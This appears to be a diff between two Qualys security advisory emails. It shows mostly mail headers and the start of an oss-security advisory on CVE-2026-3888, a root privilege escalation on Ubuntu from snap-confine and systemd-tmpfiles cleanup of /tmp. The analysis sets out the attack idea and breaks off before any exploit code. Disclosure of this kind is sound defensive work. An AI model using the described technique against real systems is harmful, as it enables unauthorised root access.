@@ -1,4 +1,9 @@
-Received: (qmail 30696 invoked by uid 550); 17 Mar 2026 19:33:31 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["23998" "Wednesday" "4" "December" "2019" "20:49:22" "+0000" "Qualys Security Advisory" "qsa@qualys.com" "<20191204204020.GB7012@localhost.localdomain>" "394" "[oss-security] Authentication vulnerabilities in OpenBSD" "^Date:" nil nil "12" "2019120420:49:22" "[oss-security] Authentication vulnerabilities in OpenBSD" (number mark "        qsa@qualys.c Dec  4  394/23998 " thread-indent "\"[oss-security] Authentication vulnerabilities in OpenBSD\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Authentication vulnerabilities in OpenBSD" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 11771 invoked by uid 550); 4 Dec 2019 20:49:37 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,1044 +11,477 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 30357 invoked from network); 17 Mar 2026 19:33:29 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=
-	content-id:content-transfer-encoding:content-type:date:from
-	:message-id:mime-version:subject:to; s=qualyscom; bh=vTWdLHC+IUj
-	JbQOMrlf+LfC9GmDSyZ+Qmz+cHCe+uCQ=; b=JTCdWrNPCAK7tA43qfqyuIxe/YU
-	iCGfUn4WaZ3rb3/j35JgES3FB8r8p9RiSacS6VniLcxJatfBIVtFekLiEDnrxMjG
-	4LGXLYxhC1ieG+eCl7BGEJbg5v3nPoFXK2xpqPlJAbZp2Gx9HA1UO+PDbjIU6cJZ
-	JbASCFDOBjXUFfJM5cVCleBFq9snoCG3BAkVOi8kpDfTeH26FPYdjgT9JO0enCai
-	ZRztWx+U7qY94G3ovmKXJ+B3CnJLRdpZM0z+b6qflh6bsSma846oFuCTxdSmyZ65
-	zFVRCCi/Gfq2YELZrBcfkypHTPfyTDxjfAg5+KkFN6okx3sCnB5a3vpjnPw==
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
- b=F37HG+G8po7Bvn62a1Jbvck9qQh/IopTlc+7QELMzNdNL6oPpF3NEA2YAyAAwyy1IN+jXUuyv3uUYUKOUBbIl6p+8aL2/LsPjeDjqrNDvtTDsB6D+XOHzPvR8pqDXqkW/9uwRU5SaMo1helxkLaMizbF1l+wDMbU+tFEdUh/plbXFPrrS8vmlzW9yDOUdq+KHQWEcQT8mAVks0RLHuQeaYepo5dOqFOKQVUKfFWPmPh5txD8j3LYH7EPjSwxNWF0J3u0xhKorJj65cRK6jxZUWQHz2BmHIQxb1gCi4/0e/sMkgouhkwIZXXqO3EQ3M79INnAEWms84FUtBDuTwVlzw==
+Received: (qmail 11750 invoked from network); 4 Dec 2019 20:49:36 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=from : to : subject :
+ date : message-id : content-type : content-id : content-transfer-encoding
+ : mime-version; s=qualyscom;
+ bh=VBFlgzDNMX+p0Oydh/7pUNgEkmlWtwI4sEC904Q+4no=;
+ b=JnBGMUh2/g0sRuyMMyFwBvHTmU82LMN46UQydGAJV6rCugyQlvF1Z/3FmMfSXUYw3adA
+ TxYybdxPmGnSVeaNiTRhQm91LkdbcDZySRSG0D+ZRgbKqWup03EMBhrls3PI0OeCkuFI
+ h7SohMGjOvtcPpFQo529+YcqoOXN1zX07N83l9MFPN6rt2rGxrlR2m8b9LzPIKkQIexV
+ My0mglhuNn3aFh/+tcBeay5zGuFdPi/rxhuMPW08iYBHKK4m0tlgcXcdqswwA4559k01
+ lcVbQ3H6wXzaZFoIIDggjWfYRzZwOP02P20+/tKp7aKPlgLbhkG1FO9Bvmng7Sq4iBxq hQ== 
+Authentication-Results: ppops.net;
+	spf=pass smtp.mailfrom=qsa@qualys.com
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
+ b=VmEjC3qDK2/mq+kKgub0uY9HATSf89t1crvMhCrjr0b4Ri0G7VUKfHAqulv5zExdtqIxdcB30fyA/yYV3ox21y5yW5VeCIoCJUXVQhZ1CH+cmCt54LS+T9/Q8mwHR/vjZCOPglSViF1HX5cdgsgoYjvfvmZsTMoqHDJ85qZIYZl0VKrRBGktNX46qEK63Q6wV8ohQ9dHpUIO3ANYm/3Nnnl4cZ0uHomDxhU5t32Cmg2QQ5MUjgZVm3pYS7CGZES2oqAlPSREm9rdE/6/DwdROPj1bPo95xFARUMzGsJOizKhx0UKn4U7KJ7i6W1C013l9US4kMn6isGEyjxjJ2dwbw==
 ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector10001;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=vTWdLHC+IUjJbQOMrlf+LfC9GmDSyZ+Qmz+cHCe+uCQ=;
- b=DcUTEtNxAJLj+XGm9wRP2V7pHSRb+FC4+6ZYkFpGvqr0gYcxR2mqiVFj9BAwn5q1EExrbHu697/gqhbxgULMzq7dCl3vKTdZ3lduie32Gbph3yYwKBQTZ1o/JQFjVDqlL5hnrSIE4oPmIdpQ+3iAQcxp2KCI/0KxCMPkTQGBiBYzMgRyfkXesxO3MtHfNJzzdmA5MD2/i7fFnsUSdQKjGcHTVzZ9LPEpl626GIZ+8xOuNAq40eI3cKtBnWjFEkrKbs+vD0TC5FdxeZ8f3QTqYFf2bWkhwG+aUic0ui0S7Q+1es4w29z87ABtzyAh+q8Ooy3yn+114hvFrEgGiwdBSg==
+ s=arcselector9901;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=VBFlgzDNMX+p0Oydh/7pUNgEkmlWtwI4sEC904Q+4no=;
+ b=B5+2f6FUh1M14MWNv+HdkgopG174bqOhRzXH1SzPd9uGW8Onu9v4eDMMvO3n9hvjVrplSCLMBpM/TMateBDKwtxcSWnqX1/5TCnYUl+2lxzqR1nmjRm82sLDs5mc+pU/Ub9Xx+1tqwojf6mF5ANY1BNwQmB2c3xXF3Asp2iHWN7KKc69ahpzfEL4hFxnHLNo6BGU3hPDgdrzO4nPSLYheXyFlqQpwFv39HWG9J5ihDCsvKRO4r/Usrr2y3uLCp3iFRP75oIp16DEkqfJkk+WLPvxaJqBp//2DJPEAdcj46osm6QAOV1n3oWnx92JzFlrY7CP+VBPoUm8a97WKZj0wg==
 ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
  smtp.mailfrom=qualys.com; dmarc=pass action=none header.from=qualys.com;
  dkim=pass header.d=qualys.com; arc=none
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=qualys.onmicrosoft.com; s=selector1-qualys-onmicrosoft-com;
+ d=qualys.onmicrosoft.com; s=selector2-qualys-onmicrosoft-com;
  h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=vTWdLHC+IUjJbQOMrlf+LfC9GmDSyZ+Qmz+cHCe+uCQ=;
- b=CbcZlGdfoa4rMYFds/dA9sWY6vHXnKKqQ03XDHZ5r+NavzJcVe4Ltp2fin6/MzDgMVJEw7hBpsqv2OfMHohf4ECXw+LHpRVYRc48n3WVqRACn3BTiOmKZ+EMjDdAUmFqdX1qvbhqd06a2EiCIgTEVI9mZHjW5kTmTioz6eP8gljEpZCe9dxfawjVHFoB7IFCzKex5nYjt9HengvZR/ZLJWVi/BZdrUjm7+FNCT3S5jwnOafH+b9/CX26nCA8zsReABzge0edxqBTRhgs1aZ7WAd9c0JOmGEW4hNTsZGX68RGDD8FZKDE4oRWiKnqUNvj6t8wkS3UGAZxCXbiDzgFpQ==
-From: Qualys Security Advisory <qsa@qualys.com>
-To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
-Thread-Topic: snap-confine + systemd-tmpfiles = root (CVE-2026-3888)
-Thread-Index: AQHctkTn6w3QdOeCE0CmPTALv6ujXg==
-Date: Tue, 17 Mar 2026 19:33:16 +0000
-Message-ID: <20260317193301.GA1285@localhost.localdomain>
+ bh=VBFlgzDNMX+p0Oydh/7pUNgEkmlWtwI4sEC904Q+4no=;
+ b=am7n1PJxAP4DcE4CvQuodGuKNgKymUFyq4zJvTBPfSrOtgMSHldanAB9yXWaGPtv4GRqdQf/MIHqJkYoJoVYHYtQkO7HtpsRsCJkPYjsMptcpwc5teNoDEO6SbQyd++t2OFKL1oJj86fHrZg9RBL0JE3Mo/GVS8RgYk+O9rl6Fs=
+Thread-Topic: Authentication vulnerabilities in OpenBSD
+Thread-Index: AQHVquROtI0EyhSKzEmelDedaXNnfA==
+Message-ID: <20191204204020.GB7012@localhost.localdomain>
 Accept-Language: en-US
 Content-Language: en-US
-X-MS-Has-Attach:
-X-MS-TNEF-Correlator:
+X-MS-Has-Attach: 
+X-MS-TNEF-Correlator: 
+x-clientproxiedby: BYAPR08CA0047.namprd08.prod.outlook.com
+ (2603:10b6:a03:117::24) To DM6PR06MB4090.namprd06.prod.outlook.com
+ (2603:10b6:5:89::22)
+x-ms-exchange-messagesentrepresentingtype: 1
+x-originating-ip: [165.193.18.162]
 x-ms-publictraffictype: Email
-x-ms-traffictypediagnostic: LV5PR06MB11218:EE_|BL4PR06MB9917:EE_
-x-ms-office365-filtering-correlation-id: d3f82bb3-c480-4aef-f948-08de845c09cd
+x-ms-office365-filtering-correlation-id: ec107fab-0ed6-452e-1a3c-08d778fb7098
+x-ms-traffictypediagnostic: DM6PR06MB6009:
+x-microsoft-antispam-prvs: 
+ <DM6PR06MB6009B27328DC3BCC8C260DA2D55D0@DM6PR06MB6009.namprd06.prod.outlook.com>
+x-ms-oob-tlc-oobclassifiers: OLM:2449;
+x-forefront-prvs: 0241D5F98C
+x-forefront-antispam-report: 
+ SFV:NSPM;SFS:(10019020)(39860400002)(346002)(396003)(136003)(376002)(366004)(189003)(199004)(30864003)(5660300002)(1076003)(8676002)(2351001)(71190400001)(33656002)(3480700005)(71200400001)(66556008)(66946007)(316002)(66446008)(64756008)(66476007)(14444005)(478600001)(2501003)(14454004)(26005)(102836004)(6306002)(6486002)(18074004)(7736002)(305945005)(52116002)(86362001)(19627235002)(8936002)(99286004)(186003)(5640700003)(2906002)(6436002)(81166006)(25786009)(9686003)(3846002)(6512007)(6116002)(6506007)(6916009)(81156014)(131040200001);DIR:OUT;SFP:1102;SCL:1;SRVR:DM6PR06MB6009;H:DM6PR06MB4090.namprd06.prod.outlook.com;FPR:;SPF:None;LANG:en;PTR:InfoNoRecords;MX:1;A:1;
+received-spf: None (protection.outlook.com: qualys.com does not designate
+ permitted sender hosts)
 x-ms-exchange-senderadcheck: 1
-x-ms-exchange-antispam-relay: 0
-x-microsoft-antispam:
- BCL:0;ARA:13230040|1800799024|376014|366016|38070700021|18002099003|56012099003;
-x-microsoft-antispam-message-info:
- 3+dBFMt7TRoY34yjah2VEbG95WCw0pdrhHaFG3O8GLoNH8qnbGafQnuFNiQpO9Et1+XjVM+5y6O4JpstUDs00TjzshSZhP3mejUICFKrXYACOLj3ciDl12cYqD0m8m6XT4o9QdMkeMuEPpMTpyKEC9vVm4M8Rl2nS+l0oJfbJQ52ECUvXglTr+EUSqSh+yZD73QQ/OwxGEMdoPEuWxU06+Q2O6853niSnoR+OiZzTZK7eLVsA6pBxW0CTJf8n0vJwZ4+C/P6pchLVgqZzBe94UGik9+c6t+kNYPEkLumFLEnltN8E0SXalqe+0UcvRgF/PTaFV3l5t/feAgHM1rEIjD3z7Qp6hxV4/XNI5rQYTcWQqKJyfQXAvuRsjHW8ekzkwZprcHR9ihZxoPga+vcG5VBWrPyE9Xh5heRewUw5ZFZyGBCvJpG8LUGicyJ3h0aXIgxnTsIGlharTopY1mLvHGlVArtbQ0zLWRWGBEHmCjmVRFLoRrC4MwPW2S4a0F9lclNnf/6Q7NwjsS963JYxPwlZcmrQL2R/j57O6p+06zFqFFcOekaMbGfFvzMZwE2tKUkawa9T8G22J+ZkN7oi9oZV05AvIa0lzeoy3V+MBog9oSbbe+niv7XTH2ZKq0bNAt3iiL4gfYKqlg5++f8KQG50yJJ9j0CgU4mBkk1+8aUxuSyxrYKiCXQDSaRDkMs8oDeYtn0mdbT2lAWqn/I9cgpeqiv9eKbfZyc5f1ROoe5nqVilXaSmOKx7frtlt2M
-x-forefront-antispam-report:
- CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:LV5PR06MB11218.namprd06.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(1800799024)(376014)(366016)(38070700021)(18002099003)(56012099003);DIR:OUT;SFP:1102;
-x-ms-exchange-antispam-messagedata-chunkcount: 1
-x-ms-exchange-antispam-messagedata-0:
- =?us-ascii?Q?FMXu9Q/HqQAvH7uQA6+K9uiyVwoHV6WKDt+65IWuWehMyDQT/6S2Wa2exIpo?=
- =?us-ascii?Q?u7NRZ1adNnz41DTziHcC7wT6Wr6LrwZBETaf7fFXEP5kgxxfi1OSNC8ozziC?=
- =?us-ascii?Q?eMW9my/eRSwk8LQG9CZLUd4XmuCpW7smsIyqtKePn8CqN/e/3Amfjq7dlSVp?=
- =?us-ascii?Q?/xjwK3im5xWFdJt+kU7Bz5oV/XOEg+u1Q+v8v2yKiE2NWbeBNk860vIIzBz1?=
- =?us-ascii?Q?RVt2m40Bzcfprd77WqH/IuRbWetbMny5vfpf+lZbA9ZUCo7n3FDtW0wCziOB?=
- =?us-ascii?Q?6xowiga0vNjmd3O0OxqKt91KrxrasqfuNGpQADIMk3vXHwbd+ihm/5aiPJh+?=
- =?us-ascii?Q?kKOjGLp5JceKKChDzFfu5PeVisRxgjM+aUb75exEORtsRtMAvHpV+dcS9jK/?=
- =?us-ascii?Q?0VxoHWXfAbTai2o+TXMs+K6ZXywVaG1BjjlCdVg3CX8VxuucSu1qDxh7AXmS?=
- =?us-ascii?Q?fOTQCbHI7MkgZKQqA0TN1zcaFHH72odCLb+aYuJqvYpehtxNHa8EtkaVoc8I?=
- =?us-ascii?Q?q3vOBsOBVdwbSBf1bzp05cmcHqNk7eMUFxfnwzegxkEInlvyJD7xWOWPMKvH?=
- =?us-ascii?Q?R+2WwMyBR3krcZL8Mnd9D+GsifYOidG3GbkQgEFf/KFYpHPwgANDFWlac9tJ?=
- =?us-ascii?Q?DH1JTORYclChyRQPtcdsDr7sjgfLyj2PUVH0eEd+r24pWTITNH/xfJWpddXd?=
- =?us-ascii?Q?g3AWH/YYQ3YI/zkRKBHmxyFRUBqPiRC5viihQ5X9fbAfEhXb1OGRe5jDhUx6?=
- =?us-ascii?Q?++7MSTqUy5Aa8pBatoo4rVb5uitEQVS2CMbS9R4RmxoZaimY3sRxR2hQmMhO?=
- =?us-ascii?Q?mJNG7zPqFc47fBCpIRLnIVJ2F+H5udU9wi1ZrEHSuY0ZMNhR9rczbR7zcyKr?=
- =?us-ascii?Q?zCHn1RiwMNiius9+FBeVYwVidXx5AUkVQEog/YQ4zRij7NpZnoh8G0dLHdI0?=
- =?us-ascii?Q?9oPyi1e3fEgwClYdmiywM/yadup9RHgWj5KJwmR4P3QgArN/mA81e0LO8aLC?=
- =?us-ascii?Q?g6uw8DhUuWBl6AUjYV/qMhokfSVUKqqxMl5KsfRulGmVHbuVHYjdZAYlaGWp?=
- =?us-ascii?Q?k828WsrXlGDMkC/JuSHGSe+Z5UrqggB62WLDTgGfjLPNupH+/yBTkoJn5oJI?=
- =?us-ascii?Q?AowzVxvRfm2Z0ikf6xH7KQRjeREg+d5lpSK5DScp2ly7J+2NLZiC8A4ki/RZ?=
- =?us-ascii?Q?ZF8s7UTZ4IKv/nXffKoEqt+2ZVrWIrEzuQo9PEAFcbJsbWV17FqpTDF5QkVC?=
- =?us-ascii?Q?YBeqcQp5PbvZjKmwHUEeBZc/FDjnD5Y32bufid82D5gOb98lqTcu4zzRr5mq?=
- =?us-ascii?Q?c/IBP8ri0uqaRNqB6WkwV0Zp0OWPKloujQaffZYr++ycODiXJA9hvvvDNgDR?=
- =?us-ascii?Q?M03dQdngZxtbB2b5cx3Xxj0TP2czGJpbzER2aNIK6Yf82tBpVRkmgINa7g/G?=
- =?us-ascii?Q?P5DqjYHvCFFeV4WHoZe2q3W32BZR2/Uue1jm6x2ELpspVwNM+iNRFWbLP4h9?=
- =?us-ascii?Q?kyNGf8H61aR1VAwp8J2tgC5+5t0rE/g/U4Rf0sV7sFNhZeRDWENdJJd5pkWY?=
- =?us-ascii?Q?lrXNc1712CHfhEZiuuor2A59TqUhDnSYh/OkU5D/QVa9b+mqXgqO3s9dYCtS?=
- =?us-ascii?Q?JAWumjeOxA3nNMEsxBvDU7D9rL9Zzy6nPBE2hqBel5c3oAoW/F3+Q7/chBs5?=
- =?us-ascii?Q?Jecl5fmDKi9syj0S+SnZKrvBu+Lr1F6ZxSKF3ngxSde3ARoeAvvf0NWtu4/O?=
- =?us-ascii?Q?upfzBTyy6oA568k4hbr/175Zb54STw0=3D?=
-Content-Type: text/plain; charset="us-ascii"
-Content-ID: <6B4C749B0C9E8C4FA221DC9BBFCDC361@namprd06.prod.outlook.com>
-Content-Transfer-Encoding: quoted-printable
+x-microsoft-antispam: BCL:0;
+x-microsoft-antispam-message-info: 
+ Jan9Ie1FZgts9CKcKfVoun0+HGdRaqtqtcdWgcl8POdqlNNGQIcdztZvW7aEQ3aK/vwU49/sh5U+zPNJNUrV0xTtIo2/veXqh/lOMis7Hf0KaG3II8Pgr+UTM/NxFN1y5wXyIRJ7T5ztNEy5PgqYI+ZQY+lvbNJaHxISeTFPLtqr+4r0m3vZ4JC73hod5OgZzojI9lZCR+72dGDURBDnof0RzcHoVpOzXwCvbvz4R9gj03s1J7kveQFLfF6Ymyjp6FWFN2MgY3ZUen1BRf5uCmSSjDK35WOESAJANIdTmBpnKTXHdWaPv02itLYdelzygbaviocCGvAj/JVTAjDPd5glNZMVpzgUTx1g3rzgU3DiMdzCYLAZgHiefeiBvVWTonsfX+VAz3xJZlNCxZut8PAA1DRMOwbtj3oDH+OvEMt+PabyNXkBnsKL3PRQnZaUJuFtWOPY7QooMClQhU+w0LNs0PXrC77JPsn0HLYNshdGk48reURIskkjWdooULtq
+x-ms-exchange-transport-forked: True
+Content-Type: text/plain; charset="utf-8"
+Content-ID: <312728D3667D814E83C3E921A6753AB8@namprd06.prod.outlook.com>
+Content-Transfer-Encoding: base64
 MIME-Version: 1.0
-X-Exchange-RoutingPolicyChecked:
-	MGkr+8sFvbAAIDqT2zv8LdIoMF5FvyHRpVZl2FeKf4SvRbEpDGq2rbM4FE0k4dmXgCzpsJzYCvkTQuMvCdOb7V/nxR9v4/Yl3Cn3adikDQ5zKIirvNR8Ojy6rV0i6su32ouFxc6M4tv/hHjS27egN8wFMBNbGjIqH1J5yd6a6INC2S9UtdUYw1rsqHHloHANEOheBusY6rqFd7qrvBIxingCijPM9q2AmcHGVzSnhwe2m9E2IqTanFqvQTYGs/3ZFnOaVaQ9L1phRTU0BkfMeMVx02M3H5+6WdOAODnVA5EyQjlGvnOZy3kK2/nwa1YjbIHGJRXQC4mYP9qMYw16LA==
 X-OriginatorOrg: qualys.com
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-AuthSource: LV5PR06MB11218.namprd06.prod.outlook.com
-X-MS-Exchange-CrossTenant-Network-Message-Id: d3f82bb3-c480-4aef-f948-08de845c09cd
-X-MS-Exchange-CrossTenant-originalarrivaltime: 17 Mar 2026 19:33:16.9040
+X-MS-Exchange-CrossTenant-Network-Message-Id: ec107fab-0ed6-452e-1a3c-08d778fb7098
+X-MS-Exchange-CrossTenant-originalarrivaltime: 04 Dec 2019 20:49:22.1612
  (UTC)
 X-MS-Exchange-CrossTenant-fromentityheader: Hosted
 X-MS-Exchange-CrossTenant-id: 81a9ef9a-9a98-4b00-886a-895a603bc029
 X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
-X-MS-Exchange-CrossTenant-userprincipalname: J4A29aMF3I02Z83vPuK949ywWf4KvOtF6HKi2odBwppM6O4ar7ifF77xvNCedGZWmphqkrTpGCugu9eICmMdfwpj8cMNrzIaFfVooj8wRLQ=
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: BL4PR06MB9917
-X-Proofpoint-Virus-Version: vendor=baseguard
- engine=ICAP:2.0.293,Aquarius:18.0.1143,Hydra:6.1.51,FMLib:17.12.100.49
- definitions=2026-03-17_04,2026-03-17_02,2025-10-01_01
-Subject: [oss-security] snap-confine + systemd-tmpfiles = root (CVE-2026-3888)
-
-
-Qualys Security Advisory
-
-Good things come to those who wait:
-snap-confine + systemd-tmpfiles =3D root (CVE-2026-3888)
-
-
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-Contents
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-
-Summary
-Case study: Ubuntu Desktop 24.04
-- Analysis
-- Exploitation
-Case study: Ubuntu Desktop 25.10
-- Overview
-- Exploitation
-A quick note on the uutils coreutils (the rust-coreutils)
-Acknowledgments
-Timeline
-
-    And that is why Caterpillar was never in a hurry.
-    She knew that good things come to those who wait.
-        -- Tinga Tinga Tales, "Why Caterpillar is Never in a Hurry"
-
-
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-Summary
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-
-We discovered an unusual Local Privilege Escalation (LPE), from any
-unprivileged user to full root, in the default installation of Ubuntu
-Desktop >=3D 24.04. We found this vulnerability particularly interesting:
-
-a/ it stems from the interaction of two otherwise secure programs:
-
-- snap-confine, which is set-user-ID-root (or set-capabilities), and
-  "used internally by snapd to construct the execution environment for
-  snap applications" (man snap-confine);
-
-- systemd-tmpfiles, which is executed as root once per day, and
-  "creates, deletes, and cleans up files and directories, using the
-  configuration file format and location specified in tmpfiles.d(5)"
-  (man systemd-tmpfiles);
-
-b/ an unprivileged local attacker who wants to exploit this LPE must
-wait for 10 days (in Ubuntu > 24.04) or 30 days (in Ubuntu 24.04) to
-obtain a fully privileged root shell.
-
-As a side note, we also discovered a local vulnerability (a race
-condition) in the uutils coreutils (a Rust rewrite of the standard GNU
-coreutils -- ls, cp, rm, cat, sort, etc), which are installed by default
-in Ubuntu 25.10. This vulnerability was mitigated in Ubuntu 25.10 before
-its release (by replacing the uutils coreutils' rm with the standard GNU
-coreutils' rm), and would otherwise have resulted in an LPE (from any
-unprivileged user to full root) in the default installation of Ubuntu
-Desktop 25.10.
-
-
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-Case study: Ubuntu Desktop 24.04
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-
-    Go slow, go slow,
-    If you want to grow.
-        -- Tinga Tinga Tales, "Why Caterpillar is Never in a Hurry"
-
-________________________________________________________________________
-
-Analysis
-________________________________________________________________________
-
-We recently noticed that, in the default installation of Ubuntu since
-version 24.04, systemd-tmpfiles is configured to automatically clean up
-the files and directories in /tmp that are older than 30 days (in Ubuntu
-24.04) or 10 days (in Ubuntu > 24.04). More precisely, systemd-tmpfiles
-traverses /tmp once per day and deletes all the files and directories
-that have not been accessed nor modified for more than 10 or 30 days.
-
-------------------------------------------------------------------------
-$ cat /etc/os-release
-PRETTY_NAME=3D"Ubuntu 24.04.3 LTS"
-...
-
-$ cat /usr/lib/tmpfiles.d/tmp.conf
-...
-D /tmp 1777 root root 30d
-#q /var/tmp 1777 root root 30d
-------------------------------------------------------------------------
-
-------------------------------------------------------------------------
-$ cat /etc/os-release
-PRETTY_NAME=3D"Ubuntu 25.10"
-...
-
-$ cat /usr/lib/tmpfiles.d/tmp.conf
-...
-q /tmp 1777 root root 10d
-q /var/tmp 1777 root root 30d
-------------------------------------------------------------------------
-
-=46rom our "Lemmings" and "Leeloo" advisories, we then remembered that
-snap-confine does highly privileged work in /tmp; in particular, in the
-/tmp/snap-private-tmp directory, which is securely created at boot time
-(as user root, mode 0700):
-
-  https://www.qualys.com/2022/02/17/cve-2021-44731/oh-snap-more-lemmings.txt
-  https://www.qualys.com/2022/11/30/cve-2022-3328/advisory-snap.txt
-
-------------------------------------------------------------------------
-$ cat /usr/lib/tmpfiles.d/snapd.conf
-D! /tmp/snap-private-tmp 0700 root root -
-------------------------------------------------------------------------
-
-We therefore came up with the following idea: if, unbeknownst to
-snap-confine, systemd-tmpfiles deletes one of the files or directories
-from snap-confine's /tmp/snap-private-tmp, can we (an unprivileged local
-attacker) re-create the deleted file or directory ourselves, and exploit
-snap-confine's privileged work to obtain a fully privileged root shell?
-
-Still from our "Lemmings" and "Leeloo" advisories, we also remembered
-that, to set up a snap's sandbox, snap-confine creates a directory named
-/tmp/snap-private-tmp/$SNAP/tmp (as user root, mode 01777) that is later
-bind-mounted onto the /tmp directory inside the snap's sandbox.
-
-And inside this /tmp directory (inside the snap's sandbox), snap-confine
-creates a directory named /tmp/.snap (as user root, mode 0755) to create
-"mimics"; for example, inside the sandbox of each and every snap that is
-installed by default on Ubuntu Desktop, snap-confine bind-mounts the
-/usr/lib/x86_64-linux-gnu/webkit2gtk-4.0 directory:
-
-- to bind-mount this directory, snap-confine must first create its
-  /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0 mountpoint, which does not
-  normally exist;
-
-- but inside the snap's sandbox, /usr/lib/x86_64-linux-gnu is in a
-  read-only filesystem (the "core22" base's squashfs);
-
-- so snap-confine must first create a "mimic" of
-  /usr/lib/x86_64-linux-gnu (a writable copy of
-  /usr/lib/x86_64-linux-gnu), by:
-
-1/ bind-mounting the original, read-only /usr/lib/x86_64-linux-gnu onto
-/tmp/.snap/usr/lib/x86_64-linux-gnu (inside the snap's sandbox);
-
-2/ mounting a new, writable tmpfs onto /usr/lib/x86_64-linux-gnu;
-
-3/ bind-mounting every file and directory from
-/tmp/.snap/usr/lib/x86_64-linux-gnu back into /usr/lib/x86_64-linux-gnu;
-
-4/ creating the /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0 mountpoint
-(which is in a writable tmpfs now);
-
-5/ finally bind-mounting
-/snap/firefox/6565/gnome-platform/usr/lib/x86_64-linux-gnu/webkit2gtk-4.0
-(for example) onto /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0.
-
-------------------------------------------------------------------------
-$ grep /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0 /var/lib/snapd/mount/*
-/var/lib/snapd/mount/snap.firefox.fstab:/snap/firefox/6565/gnome-platform/u=
-sr/lib/x86_64-linux-gnu/webkit2gtk-4.0 /usr/lib/x86_64-linux-gnu/webkit2gtk=
--4.0 none rbind,rw,x-snapd.origin=3Dlayout 0 0
-...
-------------------------------------------------------------------------
-
-Consequently, our theoretical idea to exploit snap-confine is:
-
